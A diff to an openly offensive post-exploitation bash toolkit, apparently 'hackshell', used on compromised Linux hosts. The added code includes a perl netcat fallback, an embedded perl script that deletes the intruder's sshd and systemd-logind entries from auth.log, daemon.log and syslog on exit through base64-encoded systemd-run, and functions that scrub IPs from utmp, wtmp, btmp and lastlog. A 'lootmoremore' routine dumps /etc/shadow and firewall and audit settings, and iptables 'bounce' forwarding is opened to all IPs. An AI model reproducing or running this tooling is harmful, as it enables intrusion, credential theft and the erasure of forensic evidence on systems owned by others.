@@ -24,6 +24,8 @@
 #    ROOTFS=        Set different root. [default: /]
 #    QUIET=         No TIPS and no startup messages.
 #    NOPTY=         Do not upgrade to PTY
+#    HN=            PS1 prompt name instead of yellow MAC-ID
+#    HUSH=1         Skip lootlight (faster login)
 #
 # 2024-2025 by Messede, DoomeD, skpr
 # Similar work: https://github.com/zMarch/Orc
@@ -182,7 +184,7 @@ xsu() {
     [ $# -le 0 ] && echo >&2 -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     bak="$_HS_HOME_ORIG"
     unset _HS_HOME_ORIG
-    UID="$u" LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
+    XHOME='' UID="$u" LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
     export _HS_HOME_ORIG="$bak"
 }
 
@@ -203,7 +205,6 @@ ssh-known-hosts-check() {
     local fn="${2:-${_HS_HOME_ORIG:-$HOME}/.ssh/known_hosts}"
 
     [ $# -eq 0 ] && { echo >&2 "ssh-known-host-check <IP> [known_hosts file]"; return 255; }
-    
     ssh-keygen -F "$host" -f "$fn" >/dev/null || {
         echo -e "${CDR}ERROR${CN}: Host not found in ${CDY}$fn${CN}"
         return 255
@@ -267,6 +268,29 @@ scp() {
 }
 xscp() { scp "$@"; }
 
+xnc() {
+    HS_INFO "nc not found. Using fallback. ${CF}[Install nc with ${CDC}${CF}bin nc${CDM}${CF}]"
+    perl -e '
+        use IO::Socket::INET;
+        my $s=IO::Socket::INET->new(PeerAddr=>$ARGV[0],PeerPort=>$ARGV[1],Proto=>"tcp",Timeout=>10)or die "$!\n";
+        $s->autoflush(1);$|=1;
+        my $buf;
+        while(1){
+            my $r="";
+            vec($r,fileno($s),1)=1;
+            vec($r,fileno(STDIN),1)=1;
+            select($r,undef,undef,undef);
+            if(vec($r,fileno($s),1)){sysread($s,$buf,4096) or last;syswrite(STDOUT,$buf)}
+            if(vec($r,fileno(STDIN),1)){sysread(STDIN,$buf,4096) or last;syswrite($s,$buf)}
+        }
+    ' -- "${@: -2:1}" "${@: -1}"
+}
+
+nc() {
+    type -P nc >/dev/null && { command nc "$@"; return; }
+    xnc "$@"
+}
+
 purl() {
     local opts="timeout=10"
     local opts_init
@@ -313,7 +337,7 @@ print(get $url);'
 
 burl() {
     local proto x host query
-    _hs_internet_allowed || return 255
+    declare -F _hs_internet_allowed && { _hs_internet_allowed || return 255;}
 
     IFS=/ read -r proto x host query <<<"$1"
     exec 3<>"/dev/tcp/${host}/${PORT:-80}"
@@ -449,7 +473,6 @@ xorpipe() { xor "${1:-0xfa}" | sed 's/\r/\n/g'; }
 # HS_TRANSFER_PROVIDER="transfer.sh"
 # HS_TRANSFER_PROVIDER="oshi.at"
 HS_TRANSFER_PROVIDER="bashupload.com"
-
 transfer() {
     local opts=("-SsfL" "--connect-timeout" "7" "--progress-bar" "-T")
 
@@ -484,7 +507,6 @@ shred() {
 }
 
 command -v srm >/dev/null || srm() { shred "$@"; }
-
 command -v strings >/dev/null || { command -v perl >/dev/null && strings() { LC_ALL=C perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
 command -v strings >/dev/null || { command -v grep >/dev/null && strings() { grep -a -o -E '[[:print:]]{8,}' "$@"; }; }
 
@@ -515,16 +537,22 @@ _hs_bounceinit() {
     iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+    [ $# -gt 0 ] && return
+    # No IP specified. Not called via bounceinit or with no parameters: Allow all IPs to bounce.
+    _hs_bounce_src+=("0.0.0.0/0")
+    _hs_bounceinit_add "0.0.0.0/0"
 }
 
 bounceinit() {
-    _hs_bounceinit
-
     [ $# -le 0 ] && {
-        [ -n "$_is_hs_bounceinit" ] && return # already initialized by another hackshell or by us
         HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
         set -- "0.0.0.0/0"
+        # Delete all old ones because we are allowing new ones now.
+        iptables -t mangle -L PREROUTING -vn --line-numbers | grep -F "0x4a4" | cut -f1 -d" " | tac | while read -r n; do
+            iptables -t mangle -D PREROUTING "${n}"
+        done
     }
+    _hs_bounceinit "$@"
 
     while [ $# -gt 0 ]; do
         _hs_bounce_src+=("${1}")
@@ -555,7 +583,16 @@ unbounce() {
 }
 
 _hs_bounces_show() {
-    local str
+    local str l src dst s
+    str=$(iptables -t mangle -L PREROUTING -vn | grep -F "set 0x4a4")
+    [ -n "$str" ] && {
+        echo -en "\n${CDG}Bounce traffic from: ${CDY}"
+        echo "$str" | while read -r l; do
+            src="$(echo "$l" | awk '{print $8}')"
+            echo -n "$src "
+        done
+        echo -e "${CN}"
+    }
     IFS=$'\n' str=$(iptables -t nat -L PREROUTING -vn | grep -F "mark match 0x4a4")
     [ -z "$str" ] && return
     echo -e "\n${CDG}Current bounces:${CN}"
@@ -577,10 +614,10 @@ bounce() {
         _hs_bounces_show
         return 255
     }
-    bounceinit
+    _hs_bounceinit
 
     iptables -t nat -A PREROUTING -p "${proto}" --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
-    HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
+    # HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
     _hs_bounces_show
 }
 
@@ -615,7 +652,6 @@ ptr() {
 }
 
 rdns() { ptr "$@"; }
-
 ipinfo() {
     command -v curl >/dev/null && {
         curl -SsfLk --resolve ipinfo.io:443:34.117.59.81 https://ipinfo.io
@@ -643,13 +679,14 @@ ghostdev() {
     # Make ghost-ip unreachable (using a nat/255.255.255.255 trick)
     iptables -t nat -D PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255 2>/dev/null
     iptables -t nat -I PREROUTING -d "${ghostip}" -m state --state NEW -j DNAT --to 255.255.255.255
+    # Add this if "bounce" should also work on ghost ips:
+    # iptables -t nat -I PREROUTING -d "${ghostip}" -m state --state NEW -m mark ! --mark 0x4a4 -j DNAT --to 255.255.255.255
 
     # Add the ghost IP to the out interface (so that ARP resolution works).
     ip addr add "${ghostip}/32" dev "${out}" label "perm $out"
     iptables -t mangle -L PREROUTING -vn | grep -F "0x8011"
 
     _HS_GHOST_IS_UP=1
-    # _HS_GHOSTDEV_IS_UP=1
     [ -z "$_HS_GHOST_REMAIN" ] && HS_WARN "GhostIP will ${CR}AUTO DESTRUCT${CDM} on exit. Type ${CDC}xghost${CDM} for it to remain."
 }
 
@@ -692,7 +729,6 @@ lssr() {
 	[ $# -le 0 ] && set -- .
     find "$@" -printf "%s %M % 8.8u %-8.8g % 10s %Tc %P\n" | sort -n | cut -f2- -d' '
 }
-
 
 hide() {
     local _pid="${1:-$$}"
@@ -821,7 +857,6 @@ enc() {
 
     # Check if already encrypted:
     openssl enc -d "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" <"${1}" &>/dev/null && { HS_WARN "Already encrypted"; return; }
-
     data="$(openssl enc "${_HS_SSL_OPTS[@]}" "${HS_TOKEN:?}" -a <"${1}" 2>/dev/null)"
     openssl base64 -d <<<"${data}" >"${1}"
     _once dec_help && echo -e 1>&2 "${CDY}>>>${CN} To decrypt, use: ${CDC}HS_TOKEN='${HS_TOKEN}' dec '${1}'${CN}"
@@ -866,13 +901,8 @@ tit() {
         echo -e "${CN}>>> ${CW}TIP${CN}: ${CDC}ptysnoop.bt${CN} from ${CB}${CUL}https://github.com/hackerschoice/bpfhacks${CN} works better"
         return
     }
-	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
-	# strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
-    # gawk 'BEGIN{FS="\""; ORS=""}/\.\.\./ { next }; {for(i=2;i<NF;i++) printf "%s%s", $i, (i<NF-1?FS:""); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
     if [ -n "$has_gawk" ]; then
 	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
-    # elif command -v awk >/dev/null; then
-        # strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep -vF ...  | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
     else
 	    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | while read -r x; do
             [[ "$x" == *"..."* ]] && continue
@@ -1276,6 +1306,7 @@ _loot_aws() {
     }
 }
 
+
 _loot_yandex() {
     local str
     local rv
@@ -1504,23 +1535,142 @@ _warn_upx_exe() {
     echo -en "${str}"$'\033[0m'
 }
 
-lastlog_trim() {
-    [ $# -lt 1 ] && { echo -e >&2 "Replaces any pattern\nUsage: lastlog_trim 'IP' 'NEW IP' [/var/log/lastlog]"; return 255; }
+# Remove sshd and systemd-logind entries related to the current session from auth.log, daemon.log and syslog.
+
+_CS_SCRIPT=$(cat <<'PERL'
+use strict;
+use warnings;
+use Fcntl qw(:seek);
+
+my $sid     = $ENV{XDG_SESSION_ID};
+my $env_pid = $ENV{_SSHD_PID};
+die "Neither XDG_SESSION_ID nor _SSHD_PID is set\n" unless $sid || $env_pid;
+
+my @logs = map { -f $_ ? $_ : "/var/log/$_" } qw(auth.log daemon.log syslog);
+my $auth = (grep { /auth\.log$/ } @logs)[0];
+
+my %pids;
+if ($env_pid && $sid) {
+    $pids{$env_pid} = 1;
+} elsif ($env_pid) {
+    $pids{$env_pid} = 1;
+    open my $fh, '<', $auth or die "open $auth: $!";
+    my @alines = <$fh>; close $fh;
+    my ($ts) = map {
+        !/\bsshd\[$env_pid\]/ ? () :
+        /^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})/ ? $1 :
+        /^((?:\S+\s+){2}\S+)/ ? $1 : ()
+    } @alines;
+    ($sid) = map {
+        /^\Q$ts\E\S*\s+\S+\s+systemd-logind\[\d+\].*\bsession\s+(\d+)\b/i ? $1 : ()
+    } @alines if $ts;
+    warn "No session ID found for sshd PID $env_pid in $auth\n" unless $sid;
+} else {
+    open my $fh, '<', $auth or die "open $auth: $!";
+    my @alines = <$fh>; close $fh;
+    my ($ts) = map {
+        !/\bsystemd-logind\[\d+\].*\bsession\s+\Q$sid\E\b/i ? () :
+        /^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})/ ? $1 :
+        /^((?:\S+\s+){2}\S+)/ ? $1 : ()
+    } @alines;
+    warn "No systemd-logind session $sid entry found in $auth\n" unless $ts;
+    %pids = map { /^\Q$ts\E\S*\s+\S+\s+sshd\[(\d+)\]/ ? ($1 => 1) : () } @alines if $ts;
+}
+
+my $pid_re = %pids ? '(?:' . join('|', sort keys %pids) . ')' : undef;
+print STDERR "Session " . ($sid // 'unknown') . " => sshd PID(s): " . (%pids ? join(', ', sort keys %pids) : 'none') . "\n";
+print "$_\n" for sort keys %pids;
+
+for my $file (@logs) {
+    unless (-f $file) { print STDERR "  $file: not found, skipping\n"; next }
+    open my $fh, '+<', $file or do { warn "open $file: $!"; next };
+    my @in = <$fh>;
+    my @out = grep {
+        !(/\bsystemd(?:-logind)?\[\d+\]/ && /\b\Q$sid\E\b/) &&
+        !($pid_re && /\bsshd\[$pid_re\]/)
+    } @in;
+    my $n = @in - @out;
+    unless ($n) { close $fh; print STDERR "  $file: nothing to remove\n"; next }
+    seek $fh, 0, SEEK_SET; print $fh @out; truncate $fh, tell($fh); close $fh;
+    print STDERR "  $file: removed $n line(s)\n";
+}
+PERL
+)
+
+sshd_clean() {
+    local pid
+    [[ $UID -eq 0 ]] || return
+    pid=$(_CS_SCRIPT="$_CS_SCRIPT" _SSHD_PID="${1:-$_SSHD_PID}" perl -e 'eval $ENV{_CS_SCRIPT}; die $@ if $@')
+    [ -z "$1" ] && {
+        [ -z "$_HS_SSHD_TRIM_ON_EXIT" ] && _HS_SSHD_TRIM_ON_EXIT="$pid"
+        echo -e "Tip: ${CDC}sshd_clean <SSHD-PID>${CN} to cleanse old logs by PID"
+    }
+}
+
+clean() {
+    # FIXME: Also clean utmp/wtmp/lastlog/btmp
+    sshd_clean
+}
+
+_hs_sshd_clean_on_exit() {
+    [[ -n $_HS_SSHD_TRIM_ON_EXIT ]] || return
+    local sid="$XDG_SESSION_ID"
+    local pid="$_HS_SSHD_TRIM_ON_EXIT"
+    local script_b64
+    script_b64=$(printf '%s' "$_CS_SCRIPT" | base64 -w0)
+    systemd-run --no-block --quiet \
+        --setenv=XDG_SESSION_ID="$sid" \
+        --setenv=_SSHD_PID="$pid" \
+        --setenv=_CS_SCRIPT="$script_b64" \
+        /usr/bin/perl -e 'use MIME::Base64; sleep 2; eval decode_base64($ENV{_CS_SCRIPT}); die $@ if $@'
+}
+
+lastlog_clean() {
+    [ $# -lt 1 ] && { echo -e >&2 "Usage: lastlog_clean 'IP' 'NEW IP' [/var/log/lastlog]"; return 255; }
     perl -0777 -pi -e 'BEGIN{$f=shift;$r=shift;$l=length($f)>length($r)?length($f):length($r);$f.="\x00"x($l-length($f));$r.="\x00"x($l-length($r))}s/\Q$f\E/$r/g' -- "${1:?}" "${2:-""}" "${3:-/var/log/lastlog}"
 }
 
+utmp_clean() {
+    [ $# -lt 1 ] && { echo >&2 "Usage: utmp_clean 'OLD_IP' [/var/run/utmp]"; return 255; }
+    perl -0777 -pi -e '
+        BEGIN {
+            $ip = shift;
+            $packed = pack("C4", split(/\./, $ip)) . "\x00" x 12;
+            $s = -s $ARGV[0];
+            ($reclen) = grep { $s % $_ == 0 } (384, 192, 180, 176);
+            $reclen ||= 384;
+        }
+        s{(.{$reclen})}{index($1,$packed)!=-1?"":$1}ge
+    ' -- "${1:?}" "${2:-/var/run/utmp}"
+}
+
+# wtmp_trim <number of entries to remove> [file]
 wtmp_trim() {
-    local fn count
+    local fn count str
     
-    fn="${1:-/var/tmp/wtmp}"
-    count="${2:-1}"
-    [ ! -f "$fn" ] && return
-    local str
+    [ $# -lt 1 ] && {
+        echo -e >&2 "${CDY}Usage:${CN} wtmp_trim <number of entries to remove> [/var/log/wtmp]"
+        echo -e >&2 "\
+${CDM}wtmp${CN}    = login/logout history - ${CDC}last${CN}, ${CDC}utmpdump /var/log/wtmp${CN}
+${CDM}btmp${CN}    = failed login attempts - ${CDC}lastb${CN}, ${CDC}utmpdump /var/log/btmp${CN}
+Use ${CDC}utmp_clean${CN} and ${CDC}lastlog_clean${CN} to remove specific IPs:
+${CDM}utmp${CN}    = currently logged in users - ${CDC}who${CN}/${CDC}w${CN}, ${CDC}utmpdump /var/run/utmp${CN}
+${CDM}lastlog${CN} = last login of each user - ${CDC}lastlog${CN}, ${CDC}lastlog_clean${CN}"
+        return 255
+    }
+
+    count="${1:-1}"
+    fn="${2:-/var/log/wtmp}"
+    [ ! -f "$fn" ] && { echo >&2 "File not found: $fn"; return 255; }
 
     str="$(head -c -$((count * 384)) "$fn" | base64 -w0 2>/dev/null)" || return
-    [ -z "$str" ] && return
     echo "$str" | base64 -d 2>/dev/null >"$fn"
+    echo "Trimmed to:"
+    last -n 10 -f "$fn" | head -n "10"
 }
+
+utmp_trim() { wtmp_trim "$1" "${2:-/var/run/utmp}"; }
+btmp_trim() { wtmp_trim "$1" "${2:-/var/log/btmp}"; }
 
 memdump() {
     local pid="${1:?}"
@@ -1772,7 +1922,8 @@ _warn_skids() {
     # grep -qFm1 '~/.tmp_u' ~/.bashrc 2>/dev/null && str+="Suspicious SSH authorized_key found: ~/.tmp.u"$'\n'
     grep -qFm1 'authorized_keys' ~/.bashrc 2>/dev/null && echo -e "${CR}Suspicious SSH authorized_key shenanigans found: ~/.bashrc${CN}"
 
-    s=($(grep -HoaFm1 'XMRIG_VERSION' /proc/*/exe /dev/null 2>/dev/null | sed 's|[^0-9]||g'))
+    # This can take a long long time on some slow hosts...
+    s=($(timeout 5 grep -HoaFm1 'XMRIG_VERSION' /proc/*/exe /dev/null 2>/dev/null | sed 's|[^0-9]||g'))
     # Analyze every UPX packed process for XMRIG_VERSION string
     for x in "${_HS_UPX_PIDS[@]}"; do
         s+=($(_hs_gdb_proc_match "${x}" 'XMRIG_VERSION'))
@@ -1801,6 +1952,12 @@ _warn_skids() {
         echo "$s"$'\033[0m'
     }
 
+    s="$(grep -Pzol '\[Service\]\nType=oneshot\nRemainAfterExit=no\nExecStart=.+' /lib/systemd/system/*.service 2>/dev/null)"
+    [ -n "$s" ] && {
+        echo -e "${CR}Suspicious oneshot systemd services with no persistence:${CF}"
+        echo "$s"$'\033[0m'
+    }
+
     s="$(crontab -l 2>/dev/null |strings| grep -iE '(xmrig|mining|base64)' )"
     [ -n "$s" ] && {
         echo -e "${CR}Suspicious cronjobs:${CF}"
@@ -1812,6 +1969,17 @@ _warn_skids() {
         echo -e "${CR}Hidden processes (/proc mounted on tmpfs) found:${CF}"
         echo "$s"$'\033[0m'
         echo -e "To reveal them, type:\n  ${CDC}grep '^tmpfs /proc/' /proc/mounts|sed 's|tmpfs \(/proc/[0-9]*\) .*|\1|g'|xargs umount${CN}"
+    }
+}
+
+_warn_astra() {
+    local str
+    command -v pdp-id >/dev/null && {
+        str="$(pdp-id 2>/dev/null)"
+        [[ "$str" != *"=63"* ]] && {
+            echo -e "${CDY}Astralinux ILevel is not High (it is restricted)${CF}"
+            echo "$str"$'\033[0m'
+        }
     }
 }
 
@@ -2003,7 +2171,9 @@ lootlight() {
         _warn_rk
         _warn_upx_exe
         _warn_skids
+        _warn_astra
     }
+
     declare -F _extended_history >/dev/null && [ -n "$PROMPT_COMMAND" ] && {
         unset PROMPT_COMMAND
         echo -e "${CR}Extended bash-history was enabled. Check ~/.bash_extended_history${CN}"
@@ -2068,6 +2238,16 @@ _lootmore_lxc() {
     echo -en "${CN}"
 }
 
+_lootmore_qm() {
+    command -v qm >/dev/null || return
+
+    str="$(qm list 2>/dev/null | tail -n +2)"
+    [ -z "$str" ] && return
+    echo -e "${CB}Proxmox VMs${CF} [try qm list]${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 _lootmore_vz() {
     command -v vzlist >/dev/null || return
 
@@ -2100,6 +2280,55 @@ _loot_auth_log() {
     echo -e "${CB}SSHD Logins:${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
+}
+
+lootmoremore() {
+    local saved
+    exec {saved}>&2  # save stderr to next free fd
+    exec 2>&1        # redirect stderr to stdout
+    # Stolen from whatserver.sh:
+    set -x
+    date
+    uname -a
+    uptime
+    command -v xid >/dev/null && { set +x; xid; set -x; }
+    hostname
+    systemctl list-unit-files --all --no-pager
+    systemctl list-units --type=service --all --no-pager
+    systemctl list-units --type=timer --all --no-pager
+    systemctl list-timers --all --no-pager
+    lsmod
+    cat /proc/cmdline
+    cat /proc/config
+    [ -f /proc/config.gz ] && gunzip < /proc/config.gz || cat /boot/config-$(uname -r)
+    cat /etc/resolv.conf
+    cat /etc/hosts
+    cat /etc/passwd
+    cat /etc/shadow
+    cat /etc/group
+    ip a sh
+    ip r show
+    ip rule show
+    # command -v wg >/dev/null && wg show all dump 2>/dev/null | column -t 
+    command -v wg >/dev/null && wg show 2>/dev/null
+    ps -eF f
+    ss -lanutop4
+    ss -lanutop6
+    iptables-save
+    nft -ann list ruleset
+    sysctl -a
+    last -iwx
+    lastb -iwx
+    command -v auditctl >/dev/null && auditctl -l
+    # afick -k
+    cat /etc/afick.conf 2>/dev/null
+    cat /var/lib/afick/history 2>/dev/null
+    cat /etc/nsswitch.conf 2>/dev/null
+    cat /etc/nscd.conf 2>/dev/null
+    cat /etc/nslcd.conf 2>/dev/null
+    set +x
+    exec 2>&$saved   # restore stderr
+    exec {saved}>&-  # close saved fd
 }
 
 lootmore() {
@@ -2173,6 +2402,7 @@ lootmore() {
     _lootmore_pct
     _lootmore_lxc
     _lootmore_vz
+    _lootmore_qm
     _lootmore_video
 
     str="$(grep -sE '^[[:digit:]]' "${ROOTFS}/etc/hosts" |grep -vF -e localhost -e 127.0.0.1)"
@@ -2331,26 +2561,30 @@ ws() {
     dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
 }
 
+xresize() {
+    local R a IFS
+    # NOTE: On localhost, this wont always work because xterm responds to fast and
+    # before 'read' gets executed.
+    stty -echo;printf "\e[18t"; read -t5 -rdt R;
+    IFS=';' read -r -a a <<< "${R:-8;25;80}"
+    # Normally it returns ROWS/25:COLS/80 but some systems return it reverse
+    [ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}"; a[1]="${a[2]}"; a[2]="${R}"; }
+    stty sane rows "${a[1]}" cols "${a[2]}"
+    export COLUMNS="${a[2]}" LINES="${a[1]}"
+}
+
 _hs_try_resize() {
     local str
-    local R
-    local a
-    local IFS
     command -v reset >/dev/null && TERM=xterm reset -I
 
     command -v stty >/dev/null || return
     str="$(stty size)"
     if [[ "$str" == "24 80" ]] || [[ "$str" == "25 80" ]] || [[ "$str" == "0 0" ]]; then
-        # NOTE: On localhost, this wont always work because xterm responds to fast and
-        # before 'read' gets executed.
-        stty -echo;printf "\e[18t"; read -t5 -rdt R;
-        IFS=';' read -r -a a <<< "${R:-8;25;80}"
-        # Normally it returns ROWS/25:COLS/80 but some systems return it reverse
-        [ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}"; a[1]="${a[2]}"; a[2]="${R}"; }
-        stty sane rows "${a[1]}" cols "${a[2]}"
-        export COLUMNS="${a[2]}" LINES="${a[1]}"
+    	xresize
     fi
 }
+
+command -v resize >/dev/null || alias resize=xresize
 
 _hs_mk_pty() {
     echo -e "${CDM}Upgrading to PTY Shell${CN}${CF} [disable with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"
@@ -2465,7 +2699,7 @@ ttyinject() {
 
 unghost() {
     declare -F ghostip_destruct >/dev/null && ghostip_destruct
-    [ -n "$_HS_GHOSTDEV_IS_UP" ] && unghostdev
+    [ -n "$_HS_GHOST_IS_UP" ] && unghostdev
 }
 
 xghost() {
@@ -2480,6 +2714,10 @@ xghost() {
 }
 
 hs_exit() {
+    [ -n "$_HS_SSHD_TRIM_ON_EXIT" ] && {
+        HS_INFO "Cleanging sshd logs on exit..."
+        _hs_sshd_clean_on_exit
+    }
     cd /tmp || cd /dev/shm || cd /
     [ -n "$_is_hs_bounceinit" ] && HS_WARN "Bounce still set. Type ${CDC}unbounce${CN} to stop the forward."
     [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
@@ -2544,7 +2782,6 @@ hs_init_dl() {
     fi
 }
 
-
 hs_init() {
     local a
     local prg="$1"
@@ -2565,6 +2802,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     }
     [ -z "$UID" ] && UID="$(id -u 2>/dev/null)"
     [ -z "$USER" ] && USER="$(id -un 2>/dev/null)"
+    [ -z "$HOME" ] && export HOME=$(getent passwd $(id -u) | cut -d: -f6)
     [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
     export _HS_HOME_ORIG="$HOME"
 
@@ -2640,6 +2878,28 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
     # BusyBox timeout variant needs -t
     command -v timeout >/dev/null && timeout -t0 sleep 0 &>/dev/null && HS_TO_OPTS=("-t")
+
+    # Poor man's 'column -t'
+    command -v column >/dev/null || {
+        column() { 
+            perl -lne '
+                s/^\s+|\s+$//g;
+                @F = split /\s+/;
+                push @r, [@F];
+                for my $i (0..$#F) {
+                    $w[$i] = length($F[$i]) if length($F[$i]) > ($w[$i]//0);
+                }
+                END {
+                    for my $r (@r) {
+                    my $last = $#$r;
+                    print join "  ", map {
+                        $_ < $last ? sprintf("%-*s", $w[$_], $r->[$_]//"") : $r->[$_]
+                    } 0..$last;
+                    }
+                }
+                '
+        }
+    }
     hs_init_dl
 }
 
@@ -2706,6 +2966,38 @@ xnetstat() {
     return 255
 }
 
+# ip -4 -o addr show up scope global | sed 's/ scope.*//' | column -t
+xip() {
+{ ip -4 -o addr show up scope global; ip -4 route show; } | perl -lne '
+  if (/^\d+:\s+(\S+)\s+inet\s+(\d+\.\d+\.\d+\.\d+)(?:\/(\d+))?(?:\s+peer\s+\S+)?(?:\s+brd\s+(\S+))?\s+scope global/) {
+    my ($nic, $ip, $bits, $brd) = ($1,$2,$3//"32",$4//"");
+    my $n    = unpack "N", pack "C4", split /\./, $ip;
+    my $mask = (0xffffffff << (32-$bits)) & 0xffffffff;
+    my $net  = join ".", unpack "C4", pack "N", $n & $mask;
+    $iface{$nic} = { ip => $ip."/".$bits, net => $net, brd => $brd, gw => "" };
+  }
+  elsif (/^default\s+via\s+(\S+)\s+dev\s+(\S+)/) {
+    my ($gw, $dev) = ($1, $2);
+    $iface{$dev}{gw} ||= $gw if exists $iface{$dev};
+  }
+  END {
+    my @r = map { [$_, $iface{$_}{ip}, $iface{$_}{net}, $iface{$_}{brd}, $iface{$_}{gw}] }
+            sort keys %iface;
+    my @w;
+    for my $r (@r) {
+      for my $i (0..4) {
+        $w[$i] = length($r->[$i]) if length($r->[$i]) > ($w[$i]//0);
+      }
+    }
+    for my $r (@r) {
+      print join "  ", map {
+        $_ < 4 ? sprintf("%-*s", $w[$_], $r->[$_]//"") : $r->[$_]
+      } 0..4;
+    }
+  }
+'
+}
+
 xid() {
     local mac uuid id ips
     
@@ -2713,7 +3005,7 @@ xid() {
     command -v dmidecode >/dev/null && uuid=$(dmidecode -t 1 | grep -m1 UUID | awk '{print $2;}')
     command -v hostnamectl >/dev/null && id=$(hostnamectl  | grep -m1 Machine|awk '{print $3;}')
     ips=$(ip -4 -o addr show up scope global | awk '{split($4,a,"/"); print a[1]}' | paste -sd' ')
-    echo -e "MAC:${CDY}${mac:-NA}${CN} UUID:${CDG}${uuid:-NA}${CN} ID:${CDM}${id:-NA}${CN} IPS:${CW}${ips:-NA}${CN}"
+    echo -e "MAC:${CDY}${mac:-NA}${CN} UUID:${CDG}${uuid:-NA}${CN} ID:${CDM}${id:-NA}${CN}\nIPS:${CW}${ips:-NA}${CN}"
 }
 
 hs_init_alias_reinit() {
@@ -2739,6 +3031,7 @@ hs_init_alias() {
     alias vim="vim -i NONE"
     alias screen="screen -ln"
 
+    alias ls='ls --color=auto'
     alias l='ls -Alh'
     alias lt='ls -Alhrt'
     alias lss='ls -AlhrS'
@@ -2815,6 +3108,7 @@ hs_init_shell() {
     [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"
 
     # Do not execute lootlight on every new shell
+    [ -n "$HUSH" ] && _HS_HUSH=1
     [ -z "$_HS_HUSH" ] && [ -d "${XHOME}" ] && _HS_HUSH=1
 
     [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
@@ -2825,15 +3119,15 @@ hs_init_shell() {
         _hs_xhome_mark_running
     }
 
+    [ -z "$HN" ] && HN=$(ip l sh | grep -m1 'ff:ff' | awk '{gsub(":",""); print substr($2, length($2)-5)}')
     # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
     if [[ "$SHELL" == *"zsh" ]]; then
         PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
     else
         if [ "$UID" -eq 0 ]; then
-            PS1='\[\033[31m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
+            PS1='\[\033[31m\]\u\[\033[m\]@\[\033[32m\]\h${HN+-\[\033[33m\]${HN}}:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
         else
-            PS1='\[\033[33m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
-            # PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+            PS1='\[\033[33m\]\u\[\033[m\]@\[\033[32m\]\h${HN+-\[\033[33m\]${HN}}:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
         fi
     fi
 }
@@ -2891,7 +3185,8 @@ xhelp() {
     [[ "$1" == "bounce" ]] && { xhelp_bounce; _hs_init_color; return; }
 
     echo -en "\
-${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
+${CDC} xlog '1.2.3.4' /var/log/auth.log      ${CDM}Cleanse log file
+${CDC} wtmp_trim                             ${CDM}Trim & cleanse wtmp,utmp,btmp and lastlog
 ${CDC} xsu username <cmd>                    ${CDM}Switch user ${CN}${CF}[xsu user id -u]
